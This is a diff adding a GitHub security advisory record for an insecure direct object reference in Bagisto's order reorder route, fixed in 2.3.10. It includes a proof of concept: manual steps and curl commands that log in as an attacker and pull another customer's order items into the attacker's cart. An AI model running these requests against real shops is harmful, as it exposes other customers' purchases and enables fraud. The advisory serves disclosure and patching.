@@ -1,0 +1,66 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-x5rw-qvvp-5cgm",
+  "modified": "2026-01-02T22:50:47Z",
+  "published": "2026-01-02T22:50:47Z",
+  "aliases": [
+    "CVE-2026-21447"
+  ],
+  "summary": "Bagisto has IDOR in Customer Order Reorder Functionality",
+  "details": "### Summary\n\nAn Insecure Direct Object Reference vulnerability in the customer order reorder function allows any authenticated customer to add items from another customer's order to their own shopping cart by manipulating the order ID parameter. This exposes sensitive purchase information and enables potential fraud.\n\n### Details\n\nThe vulnerability exists in the reorder method within OrderController.php. Unlike other order-related functions like view, cancel, printInvoice that properly validate customer ownership, the reorder function retrieves orders using only the order ID without verifying that the order belongs to the authenticated customer.\n\nCode location: `packages/Webkul/Shop/src/Http/Controllers/Customer/Account/OrderController.php`\n\nExposed Route: `packages/Webkul/Shop/src/Routes/customer-routes.php`\n\n```php\nRoute::get('reorder/{id}', 'reorder')->name('shop.customers.account.orders.reorder');\n```\n\n### PoC\n\nI. Create victim account and place an order.\nII. Login as attacker.\nIII. Exploit IDOR and navigate like:  http://target.xxx/customer/account/orders/reorder/1\nIV. Check http://target.xxx/checkout/cart and verify exploitation.\nV. Victim's order items are now in Attacker's cart.\n\n### PoC via curl:\n\n```\ncurl -c cookies.txt -X POST \"http://target.xxx/customer/login\" -d \"email=attacker@evil.com&password=123qwe\"\n\ncurl -b cookies.txt \"http://target.xxx/customer/account/orders/reorder/1\"\n\ncurl -b cookies.txt \"http://target/api/checkout/cart\"\n```\n\n### Impact\n\n- **Information Disclosure:** Attackers can discover what products other customers have purchased.\n- **Potential Fraud:** Attackers could potentially exploit this for social engineering or targeted attacks.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "bagisto/bagisto"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.3.10"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/bagisto/bagisto/security/advisories/GHSA-x5rw-qvvp-5cgm"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-21447"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/bagisto/bagisto/commit/b2b1cf62577245d03a68532478cffbe321df74d3"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/bagisto/bagisto"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-284",
+      "CWE-639"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-01-02T22:50:47Z",
+    "nvd_published_at": "2026-01-02T21:15:58Z"
+  }
+}
